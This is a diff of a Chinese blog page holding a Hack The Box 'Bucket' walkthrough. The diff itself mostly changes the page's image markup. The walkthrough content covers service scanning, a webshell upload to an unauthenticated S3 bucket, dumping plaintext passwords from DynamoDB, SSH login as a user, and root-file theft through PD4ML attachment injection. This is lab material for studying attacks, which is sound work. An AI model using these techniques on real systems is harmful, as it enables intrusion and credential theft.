@@ -132,7 +132,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -226,15 +226,50 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.212</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-03 12:17 CST</span><br><span class="line">Nmap scan report for bucket.htb (10.10.10.212)</span><br><span class="line">Host is up (0.068s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)</span><br><span class="line">|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)</span><br><span class="line">|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.43 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80-bucket-htb"><a href="#80-bucket-htb" class="headerlink" title="80 bucket.htb"></a>80 bucket.htb</h2><p>直接访问80会跳转到bucket.htb然后出错，加hosts后访问：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110301.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110301.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>源码里得到一个子域名，同样加hosts：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110302.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110302.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="s3-bucket-htb"><a href="#s3-bucket-htb" class="headerlink" title="s3.bucket.htb"></a>s3.bucket.htb</h2><p>直接访问显示status，扫描目录后访问shell知道这是AWS相关服务：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110303.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110303.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  Bucket gobuster dir -u http://s3.bucket.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k -t 50</span><br><span class="line"></span><br><span class="line">/health (Status: 200)</span><br><span class="line">/shell (Status: 200)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110304.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110305.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110304.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110305.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="AWS"><a href="#AWS" class="headerlink" title="AWS"></a>AWS</h1><h2 id="awscli"><a href="#awscli" class="headerlink" title="awscli"></a>awscli</h2><p>直接用awscli，参考官方文档操作：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> install awscli</span></span><br><span class="line">sudo apt-get install awscli</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> configure aws </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> key直接空着也可以</span></span><br><span class="line">aws configure</span><br><span class="line">AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE</span><br><span class="line">AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY</span><br><span class="line">Default region name [None]: us-west-2</span><br><span class="line">Default output format [None]: json</span><br></pre></td></tr></table></figure>
 
@@ -243,18 +278,46 @@
 <h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>直接写webshell：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 cp shell.php s3://adserver/shell.php --endpoint-url http://s3.bucket.htb --no-sign-request</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110306.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110306.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>查看home目录得到用户名：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110307.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110307.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="tables"><a href="#tables" class="headerlink" title="tables"></a>tables</h2><p>根据shell目录信息显示是dynamodb，可以查看table信息,得到一些用户名密码，其中Sysadm的密码就是上面得到的roy用户密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">➜  Bucket aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/ --no-sign-request</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    "TableNames": [</span><br><span class="line">        "Image",</span><br><span class="line">        "ImageTag",</span><br><span class="line">        "users"</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">➜  Bucket aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/ --no-sign-request</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    "Items": [</span><br><span class="line">        &#123;</span><br><span class="line">            "password": &#123;</span><br><span class="line">                "S": "Management@#1@#"</span><br><span class="line">            &#125;,</span><br><span class="line">            "username": &#123;</span><br><span class="line">                "S": "Mgmt"</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            "password": &#123;</span><br><span class="line">                "S": "Welcome123!"</span><br><span class="line">            &#125;,</span><br><span class="line">            "username": &#123;</span><br><span class="line">                "S": "Cloudadm"</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            "password": &#123;</span><br><span class="line">                "S": "n2vM-&lt;_K_Q:.Aa2"</span><br><span class="line">            &#125;,</span><br><span class="line">            "username": &#123;</span><br><span class="line">                "S": "Sysadm"</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    "Count": 3,</span><br><span class="line">    "ScannedCount": 3,</span><br><span class="line">    "ConsumedCapacity": null</span><br><span class="line">&#125;</span><br><span class="line">➜  Bucket</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>直接ssh登录roy用户，得到user.txt:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">roy : n2vM-&lt;_K_Q:.Aa2</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110308.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110308.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>简单查看一些文件代码，可以知道本地开了8000端口是web service，4566是aws service：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110309.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110309.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>并且根据代码，可以知道web会从aws获取数据渲染成pdf：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REQUEST_METHOD"</span>]===<span class="string">"POST"</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>($_POST[<span class="string">"action"</span>]===<span class="string">"get_alerts"</span>) &#123;</span><br><span class="line">		date_default_timezone_set(<span class="string">'America/New_York'</span>);</span><br><span class="line">		$client = <span class="keyword">new</span> DynamoDbClient([</span><br><span class="line">			<span class="string">'profile'</span> =&gt; <span class="string">'default'</span>,</span><br><span class="line">			<span class="string">'region'</span>  =&gt; <span class="string">'us-east-1'</span>,</span><br><span class="line">			<span class="string">'version'</span> =&gt; <span class="string">'latest'</span>,</span><br><span class="line">			<span class="string">'endpoint'</span> =&gt; <span class="string">'http://localhost:4566'</span></span><br><span class="line">		]);</span><br><span class="line"></span><br><span class="line">		$iterator = $client-&gt;getIterator(<span class="string">'Scan'</span>, <span class="keyword">array</span>(</span><br><span class="line">			<span class="string">'TableName'</span> =&gt; <span class="string">'alerts'</span>,</span><br><span class="line">			<span class="string">'FilterExpression'</span> =&gt; <span class="string">"title = :title"</span>,</span><br><span class="line">			<span class="string">'ExpressionAttributeValues'</span> =&gt; <span class="keyword">array</span>(<span class="string">":title"</span>=&gt;<span class="keyword">array</span>(<span class="string">"S"</span>=&gt;<span class="string">"Ransomware"</span>)),</span><br><span class="line">		));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">foreach</span> ($iterator <span class="keyword">as</span> $item) &#123;</span><br><span class="line">			$name=rand(<span class="number">1</span>,<span class="number">10000</span>).<span class="string">'.html'</span>;</span><br><span class="line">			file_put_contents(<span class="string">'files/'</span>.$name,$item[<span class="string">"data"</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		passthru(<span class="string">"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -262,15 +325,52 @@
 <h2 id="8000"><a href="#8000" class="headerlink" title="8000"></a>8000</h2><p>8000端口转发出去方便访问：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8000:localhost:8000 roy@10.10.10.212</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110310.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110310.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建一个新dynamodb table</span></span><br><span class="line">/usr/bin/aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://127.0.0.1:4566</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将root.txt作为附件写进去</span></span><br><span class="line">/usr/bin/aws dynamodb put-item --table-name alerts --item '&#123;"title": &#123;"S": "Ransomware"&#125;, "data": &#123;"S": "&lt;pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\"&gt;file:///root/root.txt&lt;/pd4ml:attachment&gt;"&#125;&#125;' --endpoint-url http://127.0.0.1:4566</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 触发渲染</span></span><br><span class="line">curl -X POST -d "action=get_alerts" http://127.0.0.1:8000/ -v</span><br></pre></td></tr></table></figure>
 
 <h2 id="files"><a href="#files" class="headerlink" title="files"></a>files</h2><p> 渲染成的pdf在files目录下，pdf中附件txt就是root.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110311.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110312.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110311.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110312.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p> 直接查看pdf中的附件，得到root.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110313.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110314.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110313.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020110314.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>AWS Command Line Interface 是什么？ - AWS Command Line Interface<br><a href="https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/cli-chap-welcome.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/cli-chap-welcome.html</a></li>
 <li>Bucket Commands to root | RaidForums<br><a href="https://raidforums.com/Thread-Free-Flag-Bucket-Commands-to-root?highlight=htb+bucket" target="_blank" rel="noopener">https://raidforums.com/Thread-Free-Flag-Bucket-Commands-to-root?highlight=htb+bucket</a></li>
